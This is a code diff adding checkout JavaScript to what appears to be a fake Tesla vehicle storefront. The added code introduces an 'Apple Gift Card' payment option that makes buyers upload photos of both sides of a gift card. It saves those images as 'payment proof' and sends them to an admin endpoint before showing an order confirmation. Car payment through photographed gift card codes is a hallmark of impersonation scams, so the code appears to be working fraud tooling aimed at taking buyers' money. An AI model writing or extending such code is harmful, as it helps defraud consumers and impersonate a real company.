+    } else if (giftFrontData || giftBackData) {
+      statusEl.innerHTML = '<span style="color:#D97706;">⏳ ' + (giftFrontData ? 'Front' : 'Back') + ' uploaded — please upload the ' + (giftFrontData ? 'back' : 'front') + ' image to continue</span>';
+    } else {
+      statusEl.innerHTML = '';
+    }
+  }
+
+  // ── OVERRIDE selectPaymentMethod for Apple Gift Card ──
+  selectPaymentMethod = function(id) {
+    selectedPaymentId = id;
+    renderPaymentMethods();
+    var pm = paymentMethods.find(function(p) { return p.id === id; });
+    var isAppleGift = pm && (pm.type === 'gift' || pm.id === 'applegift' || pm.name === 'applegift');
+    var giftSection = document.getElementById('appleGiftUpload');
+    var regularUpload = document.getElementById('uploadArea');
+    var uploadLabel = document.querySelector('[style*="font-size:13px;font-weight:700;text-transform:uppercase"]');
+    if (isAppleGift) {
+      if (giftSection) giftSection.style.display = 'block';
+      if (regularUpload) regularUpload.style.display = 'none';
+      if (uploadLabel) uploadLabel.textContent = '🎁 Apple Gift Card Upload';
+    } else {
+      if (giftSection) giftSection.style.display = 'none';
+      if (regularUpload) regularUpload.style.display = 'block';
+      if (uploadLabel) uploadLabel.textContent = '📎 Upload Payment Proof';
+    }
+    showPaymentDetails(id);
+  }
+
+  // ── OVERRIDE submitPayment for Apple Gift Card ──
+  submitPayment = function() {
+    if (!selectedPaymentId) { showToast('Please select a payment method', 'error'); return; }
+    var pm = paymentMethods.find(function(p) { return p.id === selectedPaymentId; });
+    var isAppleGift = pm && (pm.type === 'gift' || pm.id === 'applegift' || pm.name === 'applegift');
+    if (isAppleGift) {
+      if (!giftFrontData || !giftBackData) {
+        showToast('Please upload both front and back images of the Apple Gift Card', 'error');
+        return;
+      }
+      // Save gift card images as payment proof
+      var proofs = [];
+      try { proofs = JSON.parse(localStorage.getItem('tesla_payment_proofs') || '[]'); } catch(e) {}
+      var orderId = 'TSLA-' + Date.now().toString(36).toUpperCase();
+      var proof = {
+        id: 'proof_' + Date.now(),
+        user_id: 'customer',
+        order_id: orderId,
+        payment_method: 'Apple Gift Card',
+        proof_url: giftFrontData,
+        proof_back_url: giftBackData,
+        proof_type: 'gift_card',
+        amount: deliveryMethod.priceDisplay || '$' + (deliveryMethod.price || '299'),
+        status: 'pending',
+        created_at: new Date().toISOString()
+      };
+      proofs.unshift(proof);
+      localStorage.setItem('tesla_payment_proofs', JSON.stringify(proofs));
+    } else {
+      if (!uploadedFileData) { showToast('Please upload your payment proof first', 'error'); return; }
+    }
+    // Continue with existing submit logic
+    var pmName = pm ? (pm.display_name || pm.displayName || pm.name || selectedPaymentId) : selectedPaymentId;
+    if (!isAppleGift) {
+      var proofs = [];
+      try { proofs = JSON.parse(localStorage.getItem('tesla_payment_proofs') || '[]'); } catch(e) {}
+      var orderId = 'TSLA-' + Date.now().toString(36).toUpperCase();
+      var proof = {
+        id: 'proof_' + Date.now(),
+        user_id: 'customer',
+        order_id: orderId,
+        payment_method: pmName,
+        proof_url: uploadedFileData,
+        proof_type: 'image',
+        amount: deliveryMethod.priceDisplay || '$' + (deliveryMethod.price || '299'),
+        status: 'pending',
+        created_at: new Date().toISOString()
+      };
+      proofs.unshift(proof);
+      localStorage.setItem('tesla_payment_proofs', JSON.stringify(proofs));
+    }
+    // Save order
+    var orderData = {
+      orderId: orderId,
+      trackingNumber: 'TRK-' + Math.random().toString(36).substring(2, 10).toUpperCase(),
+      email: deliveryDetails.email || '',
+      selectedCar: selectedCar,
+      deliveryDetails: deliveryDetails,
+      deliveryMethod: deliveryMethod,
+      paymentMethod: { id: selectedPaymentId, name: pmName },
+      status: 'awaiting_payment_confirmation',
+      orderDate: new Date().toISOString(),
+      estimatedDelivery: deliveryMethod.days || '5–10 business days'
+    };
+    localStorage.setItem('tesla_last_order', JSON.stringify(orderData));
+    // API call
+    var API_BASE = (typeof window.TESLA_API_BASE !== 'undefined' && window.TESLA_API_BASE) ? window.TESLA_API_BASE.replace(/\/+$/, '') : '';
+    if (API_BASE) {
+      fetch(API_BASE + '/order', { method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ sessionToken: sessionToken, selectedCar: selectedCar, deliveryDetails: deliveryDetails, deliveryMethod: deliveryMethod, paymentMethod: { id: selectedPaymentId, name: pmName } })
+      }).then(function(r){return r.json()}).then(function(r){if(r.order)localStorage.setItem('tesla_last_order',JSON.stringify(r.order))}).catch(function(){});
+      fetch(API_BASE + '/admin/payment-proofs/submit', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(proof) }).catch(function(){});
+    }
+    window.location.href = 'order-placed.html';
+  }
+
+  // ── INIT ──
+  window.selectPaymentMethod = selectPaymentMethod;
+  window.copyAddress = copyAddress;
+  window.handleFileSelect = handleFileSelect;
+  window.openCamera = openCamera;
+  window.resetUpload = resetUpload;
+  window.confirmUpload = confirmUpload;
+  window.submitPayment = submitPayment;
+  window.handleGiftFile = handleGiftFile;
+
+  loadPaymentMethods();
+
+  // Auto-select first enabled payment method
+  var enabled = paymentMethods.filter(function(pm) { return pm.enabled !== false; });
+  if (enabled.length > 0 && !selectedPaymentId) {
+    selectPaymentMethod(enabled[0].id);
+  }
 
 })();
 </script>
+</body>
+</html>
